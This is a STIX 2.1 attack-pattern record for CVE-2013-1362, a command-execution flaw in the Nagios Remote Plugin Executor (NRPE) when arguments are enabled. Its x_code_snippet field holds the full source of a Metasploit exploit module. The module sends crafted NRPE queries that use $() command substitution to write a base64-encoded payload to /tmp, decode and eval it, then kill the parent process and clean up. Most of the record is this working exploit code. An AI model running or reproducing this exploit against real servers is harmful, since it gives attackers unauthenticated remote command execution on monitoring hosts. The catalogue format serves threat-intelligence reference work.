{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4a7fe914-b9f8-41f3-8deb-00a45bef3c70",
    "created": "2024-08-14T16:57:49.614286Z",
    "modified": "2024-08-14T16:57:49.61429Z",
    "name": "Nagios Remote Plugin Executor Arbitrary Command Execution",
    "description": " The Nagios Remote Plugin Executor (NRPE) is installed to allow a central Nagios server to actively poll information from the hosts it monitors. NRPE has a configuration option dont_blame_nrpe which enables command-line arguments to be provided remote plugins. When this option is enabled, even when NRPE makes an effort to sanitize arguments to prevent command execution, it is possible to execute arbitrary commands. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/nagios_nrpe_arguments.rb",
            "external_id": "nagios_nrpe_arguments.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1362"
        },
        {
            "source_name": "reference",
            "url": "http://www.occamsec.com/vulnerabilities.html#nagios_metacharacter_vulnerability"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n#\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Nagios Remote Plugin Executor Arbitrary Command Execution',\n      'Description' => %q{\n          The Nagios Remote Plugin Executor (NRPE) is installed to allow a central\n        Nagios server to actively poll information from the hosts it monitors. NRPE\n        has a configuration option dont_blame_nrpe which enables command-line arguments\n        to be provided remote plugins. When this option is enabled, even when NRPE makes\n        an effort to sanitize arguments to prevent command execution, it is possible to\n        execute arbitrary commands.\n      },\n      'Author'      =>\n        [\n          'Rudolph Pereir', # Vulnerability discovery\n          'jwpari <jwpari[at]beersec.org>' # Independently discovered and Metasploit module\n        ],\n      'References'  =>\n        [\n          [ 'CVE', '2013-1362' ],\n          [ 'OSVDB', '90582'],\n          [ 'BID', '58142'],\n          [ 'URL', 'http://www.occamsec.com/vulnerabilities.html#nagios_metacharacter_vulnerability']\n        ],\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'unix',\n      'Arch'        => ARCH_CMD,\n      'Payload'     =>\n        {\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'perl python ruby telnet',\n              # *_perl, *_python and *_ruby work if they are installed\n            }\n        },\n      'Targets'     =>\n        [\n          [ 'Nagios Remote Plugin Executor prior to 2.14', {} ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2013-02-21'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(5666),\n        OptEnum.new('NRPECMD', [\n          true,\n          \"NRPE Command to exploit, command must be configured to accept arguments in nrpe.cfg\",\n          'check_procs',\n          ['check_procs', 'check_users', 'check_load', 'check_disk']\n        ]),\n        # Rex::Socket::Tcp will not work with ADH, see comment with replacement connect below\n        OptBool.new('NRPESSL', [ true,  \"Use NRPE's Anonymous-Diffie-Hellman-variant SSL \", true])\n      ])\n  end\n\n  def send_message(message)\n    packet = [\n      2,       # packet version\n      1,       # packet type, 1 => query packet\n      0,       # checksum, to be added later\n      0,       # result code, discarded for query packet\n      message, # the command and arguments\n      0        # padding\n    ]\n    packet[2] = Zlib::crc32(packet.pack(\"nnNna1024n\")) # calculate the checksum\n    begin\n      self.sock.put(packet.pack(\"nnNna1024n\")) #send the packet\n      res = self.sock.get_once # get the response\n    rescue ::EOFError => eof\n      res = \"\"\n    end\n\n    return res.unpack(\"nnNnA1024n\")[4] unless res.nil?\n  end\n\n  def setup\n    @ssl_socket = nil\n    @force_ssl = false\n    super\n  end\n\n  def exploit\n\n    if check != Exploit::CheckCode::Vulnerable\n      fail_with(Failure::NotFound, \"Host does not support plugin command line arguments or is not accepting connections\")\n    end\n\n    stage = \"setsid nohup #{payload.encoded} & \"\n    stage = Rex::Text.encode_base64(stage)\n    # NRPE will reject queries containing |`&><'\\\"\\\\[]{}; but not $() :)\n    command = datastore['NRPECMD']\n    command << \"!\"\n    command << \"$($(rm -f /tmp/$$)\" \t# Delete the file if it exists\n    # need a way to write to a file without using redirection (>)\n    # cant count on perl being on all linux hosts, use GNU Sed\n    # TODO: Probably a better way to do this, some hosts may not have a /tmp\n    command << \"$(cp -f /etc/passwd /tmp/$$)\" # populate the file with at least one line of text\n    command << \"$(sed 1i#{stage} -i /tmp/$$)\" # prepend our stage to the file\n    command << \"$(sed q -i /tmp/$$)\" # delete the rest of the lines after our stage\n    command << \"$(eval $(base64 -d /tmp/$$) )\" # decode and execute our stage, base64 is in coreutils right?\n    command << \"$(kill -9 $$)\" # kill check_procs parent (popen'd sh) so that it never executes\n    command << \"$(rm -f /tmp/$$))\" # clean the file with the stage\n    connect\n    print_status(\"Sending request...\")\n    send_message(command)\n    disconnect\n  end\n\n  def check\n    vprint_status(\"Checking if remote NRPE supports command line arguments\")\n\n    begin\n      # send query asking to run \"fake_check\" command with command substitution in arguments\n      connect\n      res = send_message(\"__fake_check!$()\")\n      # if nrpe is configured to support arguments and is not patched to add $() to\n      # NASTY_META_CHARS then the service will return:\n      #  NRPE: Command '__fake_check' not defined\n      if res =~ /not defined/\n        return Exploit::CheckCode::Vulnerable\n      end\n    # Otherwise the service will close the connection if it is configured to disable arguments\n    rescue EOFError => eof\n      return Exploit::CheckCode::Safe\n    rescue Errno::ECONNRESET => reset\n      unless datastore['NRPESSL'] or @force_ssl\n        vprint_status(\"Retrying with ADH SSL\")\n        @force_ssl = true\n        retry\n      end\n      return Exploit::CheckCode::Safe\n    rescue => e\n      return Exploit::CheckCode::Unknown\n    end\n    # TODO: patched version appears to go here\n    return Exploit::CheckCode::Unknown\n\n  end\n\n  # NRPE uses unauthenticated Anonymous-Diffie-Hellman\n\n  # setting the global SSL => true will break as we would be overlaying\n  # an SSLSocket on another SSLSocket which hasnt completed its handshake\n  def connect(global = true, opts={})\n\n    self.sock = super(global, opts)\n\n    if datastore['NRPESSL'] or @force_ssl\n      ctx = OpenSSL::SSL::SSLContext.new(:TLSv1)\n      ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE\n      ctx.ciphers = \"ADH\"\n\n      @ssl_socket = OpenSSL::SSL::SSLSocket.new(self.sock, ctx)\n\n      @ssl_socket.connect\n\n      self.sock.extend(Rex::Socket::SslTcp)\n      self.sock.sslsock = @ssl_socket\n      self.sock.sslctx  = ctx\n    end\n\n    return self.sock\n  end\n\n  def disconnect\n    @ssl_socket.sysclose if datastore['NRPESSL'] or @force_ssl\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-21",
    "x_mitre_platforms": [
        "unix'"
    ]
}